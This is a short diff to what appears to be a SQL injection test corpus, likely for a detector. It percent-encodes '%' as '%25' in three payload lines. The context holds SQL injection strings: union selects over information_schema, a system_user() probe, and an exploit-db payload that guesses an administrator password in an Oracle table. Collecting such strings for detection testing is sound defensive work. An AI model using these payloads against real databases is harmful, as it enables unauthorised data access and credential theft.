@@ -272,7 +272,7 @@ case when f(1) then 3 end
 -1 union select table_name as "asda" from information_schema.tables
 -1 union select table_name as `asda` from information_schema.tables
 
-a'and(select(binary(/*!system_user()*/)))like'reading%
+a'and(select(binary(/*!system_user()*/)))like'reading%25
 
 -1 union select @``"", table_name from information_schema.tables
 'foo' union select @``"", table_name from information_schema.tables
@@ -559,7 +559,7 @@ binary (binary 1) union select table_name from information_schema.tables
 \1=\1AND\1=\1;
 
 # more weird T-SQL weirdness
-\%0=\-1AND\*1=\/1
+\%250=\-1AND\*1=\/1
 
 # mysql
 -1 procedure analyse() union select table_name from information_schema.tables limit 1
@@ -626,7 +626,7 @@ ANY((SELECT 1)) - 1 UNION ALL --
 #
 # http://www.exploit-db.com/exploits/28854/
 #
-stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
+stringindatasetchoosen%25' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%25dministrator' and rownum<=1 and PASSWORD like '0%25') and '1%25'='1
 
 #
 # Thanks to @rsalgado
